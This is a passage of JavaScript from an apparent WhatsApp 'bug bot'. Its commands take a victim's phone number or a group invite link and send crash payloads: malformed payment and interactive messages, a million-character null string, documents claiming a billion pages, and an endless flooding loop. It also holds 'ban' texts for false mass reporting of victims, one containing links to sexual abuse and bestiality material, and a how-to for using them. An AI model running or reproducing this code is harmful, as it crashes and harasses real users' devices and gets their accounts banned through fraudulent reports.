	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*𝑻𝒉𝒊𝒔 𝒇𝒆𝒂𝒕𝒖𝒓𝒆 𝒊𝒔 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒃𝒐𝒕 𝒐𝒏𝒍𝒚!*");
    }
    if (!text){
      return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("𝒃𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑺𝑯𝑼𝑵𝑨𝑶𝑭𝑭🍭 𝑰𝑺 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xshuna2":
  {
	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*𝑻𝒉𝒊𝒔 𝒇𝒆𝒂𝒕𝒖𝒓𝒆 𝒊𝒔 𝒇𝒐𝒓 𝒃𝒐𝒕 𝒐𝒏𝒍𝒚!*");
    }
    if (!text){
      return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 𝒖𝒔𝒂𝒈𝒆: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑿𝑺𝑯𝑼𝑵𝑨2 𝑺𝑷𝑰𝑹𝑰𝑻𝑼𝑨𝑳 𝑨𝑻𝑻𝑨𝑪𝑲 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "tempest":
  {
    if (!isPremium) return replygcxeon(mess.prem)
    if (!text) {
      return replygcxeon("*𝑯𝑶𝑾 𝑻𝑶 𝑺𝑬𝑵𝑫 𝑩𝑼𝑮 𝑰𝑵 𝑨 𝑮𝑹𝑶𝑼𝑷*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*𝑵𝒐𝒕𝒆:*_ 𝑰𝒇 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒂 𝒍𝒂𝒓𝒈𝒆 𝒂𝒕𝒕𝒂𝒄𝒌 𝒐𝒇 𝒕𝒆𝒎𝒑𝒆𝒔𝒕, 𝒑𝒍𝒆𝒂𝒔𝒆 𝒕𝒚𝒑𝒆 𝒂𝒔 𝒇𝒐𝒍𝒍𝒐𝒘𝒔\n\n𝑬𝒙: ." + command + " 𝒍𝒊𝒏𝒌𝒈𝒄 𝒂𝒎𝒐𝒖𝒏𝒕\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑻𝑬𝑴𝑷𝑬𝑺𝑻 𝑻𝑯𝑼𝑵𝑫𝑬𝑹⚡ 𝑰𝑺 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcxeon("𝑳𝒊𝒏𝒌 𝒊𝒏𝒗𝒂𝒍𝒊𝒅!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*𝑻𝑬𝑴𝑷𝑬𝑺𝑻 𝑻𝑯𝑼𝑵𝑫𝑬𝑹 𝑺𝑬𝑵𝑻 𝑰𝑵 𝑮𝑹𝑶𝑼𝑷 𝑾𝑰𝑻𝑯 𝑺𝑼𝑪𝑪𝑬𝑺𝑺!.*");
      XeonBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygcxeon(util.format(error));
    }
  }
  break;
  case "amaterasu":
  {
	if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return replygcxeon("*𝑻𝒉𝒊𝒔 𝒇𝒆𝒂𝒕𝒖𝒓𝒆 𝒊𝒔 𝒇𝒐𝒓 𝒃𝒐𝒕 𝒐𝒏𝒍𝒚!*");
    }
    if (!text){
      return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 𝒖𝒔𝒂𝒈𝒆: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑨𝑴𝑨𝑻𝑬𝑹𝑨𝑺𝑼 𝑫𝑨𝑹𝑲 𝑭𝑳𝑨𝑴𝑬𓂀 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "vermeil": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑵𝒖𝒎𝒃𝒆𝒓 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒊𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑");
  }
  replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑽𝑬𝑹𝑴𝑬𝑰𝑳 𝑫𝑬𝑽𝑰𝑳😈 𝑩𝑼𝑮 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒔𝒆𝒏𝒕 𝑽𝑬𝑹𝑴𝑬𝑰𝑳 𝑫𝑬𝑽𝑰𝑳😈 𝑩𝑼𝑮 𝒕𝒐 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
}
break;
case "gun": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑵𝒖𝒎𝒃𝒆𝒓 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒊𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑");
  }
  replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑮𝑼𝑵 𝑺𝑯𝑶𝑻💥 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);+
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝑮𝒖𝒏 𝒔𝒉𝒐𝒕 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒔𝒆𝒏𝒕 𝒕𝒐 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
}
break;

case 'souleater': {
	if (!isCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`𝑼𝒔𝒂𝒈𝒆 .${command} 237698581946`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix+command} 237698581946`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
    }
    if (cleanedNumber == "237693538738") {
    return;
    }
    if (cleanedNumber == "237686724137") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑵𝒖𝒎𝒃𝒆𝒓 𝒊𝒔 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒌𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒅𝒂𝒓𝒍𝒊𝒏𝒈🍭");
  }
  async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await XeonBotInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🐉Limule Solitarus',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '🐉Limule Solitarus  🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus',
								title: '🐉Limule Solitarus',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await XeonBotInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🐉Limule Solitarus","key":"+237698581946","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await XeonBotInc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '🐉Limule Solitarus 🐉Limule Solitarus 🐉Limule Solitarus',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await replygcxeon(`𝑳𝑰𝑴𝑼𝑳𝑬 𝑪𝑨𝑷𝑨𝑪𝑰𝑻𝒀 𝑺𝑶𝑼𝑳𝑬𝑨𝑻𝑬𝑹👹 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒖𝒔𝒆𝒅 𝑺𝑶𝑼𝑳𝑬𝑨𝑻𝑬𝑹👹 𝒐𝒏 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'azathoth': {
					if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`𝑼𝒔𝒂𝒈𝒆 .${command} `)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix+command} 237698581946`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
    }
    if (cleanedNumber == "237693538738") {
    return;
    }
    if (cleanedNumber == "237686724137") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑵𝒖𝒎𝒃𝒆𝒓 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒐𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒅𝒂𝒓𝒍𝒊𝒏𝒈🍭");
  }
  async function xeonBugPay(jid){
				await XeonBotInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+237698581946","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
            sendMessageWithMentions(
    "𝑽𝑶𝑰𝑫 𝑮𝑶𝑫✞︎𝑨𝒁𝑨𝑻𝑯𝑶𝑻𝑯 𝑺𝑬𝑵𝑻 𝑻𝑶 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
				}
				break;
		case 'soulkill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPremium) return replygcxeon(mess.prem)
if (!q) return replygcxeon(`𝑼𝒔𝒂𝒈𝒆 .${command} 237698581946`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : .${command} 237698581946`)
let target = xeonyvictim + '@s.whatsapp.net'
await replygcxeon(`𝑫𝑰𝑽𝑰𝑵𝑬☯️𝑪𝑨𝑷𝑨𝑪𝑰𝑻𝒀 𝑺𝑶𝑼𝑳 𝑲𝑰𝑳𝑳☠︎ 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replygcxeon(`𝑺𝒉𝒖𝒏𝒂 𝑲𝒊𝒍𝒍𝒆𝒅 𝒕𝒂𝒓𝒈𝒆𝒕 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚☠ ${xeonyvictim} 𝑼𝒔𝒊𝒏𝒈 ${command}. ✅`)
}
break
case 'chaos': case 'iosx': {
            	if (!isPremium) return replygcxeon(mess.prem)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : .${command} 237698581946`)
await replygcxeon(`𝑻𝑯𝑬 𝑫𝑬𝑺𝑻𝑹𝑼𝑪𝑻𝑰𝑶𝑵 𝑲𝑰𝑵𝑮 𝑪𝑯𝑨𝑶𝑺☠︎ 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺...`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
  case "banv1": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`WhatsApp Banned 🚫 Report 😔

你好，亲爱的马克的妹妹，我想告诉你，我通过马克的儿童性应用程序收到了一份工作合同，如果它被称为官方WhatsApp，它是关于创建一个色情群组，我们将发送有关此的色情视频http:// /👇👇👇👇👇👇👇👇👇👇👇
https://matureanimalsex.icu/ar/
https://matureanimalsex.icu/ar/
سوف نحصل علا اعجابات وسوف نقوم بجني المال ونحن بلمنزل وسوف نقوم بنشر الاباحي لاخت مارك اصغيره وهاذي سيكون ممتع اذا تريد ان تشارك اصفقه معنا فعليك ان تضغط ضغطه فوق الرابط ادناه لتواصل معنا عبر الوتساب  
よろしくお願いします、アタギア・ファール、マークの妹  
👇👇👇👇👇
https://api.whatsapp.com/send?phone=+237698xxx
> by limule Solitarus`);
}
break
  case "banv2": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Ban Text


💪💪You Must Check  My WhatsApp Accuracy 

All Performance is Front Of You  Bet

Guys We Are Really Getting huge Profits Everyday  Via WhatsApp 💴💸

Now We Invite you to One Time  6 Digit Otp Join My WhatsApp Account management services you will never go Anywhere 

I Hope you will enjoy work with WhatsApp Bet a daily basis business 

We did not Business with you for one day 

We want to Long term Business 
With you my Friends 
Knock us if you have Mini  Equaity  300$ or Above 100k
👇👇👇👇👇👇💯💯💯👇👇👇👇👇👇👇👇👇👇👇
https://api.whatsapp.com/send?phone=+237xxx
> by Limule Solitarus`);
}
break
  case "banv3": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Ban Text


안녕하세요, 온라인 구매 플랫폼을 통해 추가 수입을 받고 싶습니까?
추가 수입을 얻으십시오
당신은 집에서 편안하고 싶습니다
아제르바이잔의 Minat 200-1000을 실행하십시오. 현실적인
3L 단순! (22 세 이상인 경우
직장에서 참석할 수 있습니다)))))
WhatsApp에 문의하십시오
중지 : 먼저 제발
[1] 로그인 한 다음 작업하십시오
관리자와 의사 소통
다음 연락처 정보의 2 초
488 마나트와 지출
그는 그것을받을 자격이있다!🥵🥵👺👇
https://api.whatsapp.com/send?phone=+237xxx
> by Limule Solitarus`);
}
break
  case "unbanv1": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`PERNAMENT NUMBER UNBAN. NEW WORKING REPORT .💯💯💯💪💪👇👇👇👇


ADDRESS 

android@support.whatsapp.com
android@whatsapp.com
support@support.whatsapp.com
jan@whatsapp.com
smb@support.whatsapp.com


SUBJECT 
Request an unban of a WhatsApp account:

MAIL 

To WhatsApp Support Team,

I'm writing to request that my WhatsApp account be unbanned. MY NUMBER IS +923.  My account was banned due to a violation of the terms of service, which I regret and take full responsibility for. I understand that my actions were against the rules, but I assure you that it was a one-time mistake and I have learned from it.

The ban has caused me significant distress and inconvenience, as I rely on WhatsApp for important personal and professional communications. I have lost touch with friends and family, and my work has been severely impacted. I promise to abide by the rules and guidelines going forward and request that my account be reinstated. I would greatly appreciate it if you could consider my request and unban my account. I am willing to provide any additional information or assurances necessary to regain access to my account.

Thank you for your time and consideration.

> by Limule Solitarus`);
}
break
  case "helpban": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`HOW TO BAN USING BAN COMMAND:
  1. PUT THE NUMBER OF THE PERSON YOU WANT TO BAN WHERE THERE IS WRITTEN *+237698xxx* EXAMPLE: IF YOUR VICTIME NUMBER IS +237678724567 PUT IT AT THE PLACE OF *+237698xx* .
  
  2. COPY THE TEXT BAN MODIFIED AS EXPLAINED IN 1 ABOVE THEN GO TO GMAIL OR REPORT THE TEXT THAT IS CLICK ON THE TEXT BAN WITH ANOTHER NUMBER THEN GO TO 3 DOT UN TOP SEARCH FOR REPORT OR SIGNALER THEN REPORT THE TEXT 10 OR 5 TIMES
  Thanks for using Shuna bug bot ❤️ created and developed by Limule Solitarus 
> ©2025 Limule Solitarus`);
}
break
  case "bible1": {
  if (!text) return replygcxeon(` *John 3:16-17* 

*[16] For God so loved the world, that he gave his only begotten Son, that whosoever believeth in him should not perish, but have everlasting life.* 

*https://bible.com/bible/1/jhn.3.16.KJV* 

*[17] For God sent not his Son into the world to condemn the world; but that the world through him might be saved.*

*https://bible.com/bible/1/jhn.3.17.KJV*
 
> ©2025 Limule Solitarus`);
}
break
case 'alive': {
darkphonk = fs.readFileSync('./alive.mp4')
    XeonBotInc.sendMessage(m.chat, {video: darkphonk, mimetype:'video/mp4', ptt: true}, {quoted: m })
}
break
case 'shuna': {
darkphonk = fs.readFileSync('./shuna.mp3')
    XeonBotInc.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp3', ptt: true}, {quoted: m })
}
break
case 'sealing': case 'chronos': {
	if (!isPremium) return replygcxeon(mess.prem)
	const XeonDoc = {
    url: "./69/x.mp3"
};
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await XeonBotInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🐉Limule Solitarus" + xeontext1,
    'mimetype': "application/zip",
    'caption': "🐉Limule Solitarus" + xeontext1,
    'pageCount': 0x3b9aca00,
    'contactVcard': true
});
}
}

await xeonFreeze(m.chat);
	}
	break
	case 'theosgc': case 'xblankscrn': case 'xwebgc': {
		if (!isPremium) return replygcxeon(mess.prem)
		const xeonimage = {
    title: "🐉Limule Solitarus; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};

XeonBotInc.relayMessage(m.chat, {
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': xeonimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🐉Limule Solitarus; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': m.chat,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🐉Limule Solitarus"
                    }
                }
            }
        }
    }
}, {});
		}
		break
		case 'limule': case 'xioshot':{
			if (!isPremium) return replygcxeon(mess.prem)
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
			async function XeonyCrashyIos(dgxeon, chat, participant) {
  XeonBotInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🐉Limule Solitarus${xeontext11}`,
      caption: `🐉Limule Solitarus ${xeontext11}`,
    },
    { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      XeonyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
      
    }
    }
            await executeIosAttack();
            }
    break;
case 'lockotp': case 'hypnose': {
	if (!isPremium) return replygcxeon(mess.prem)
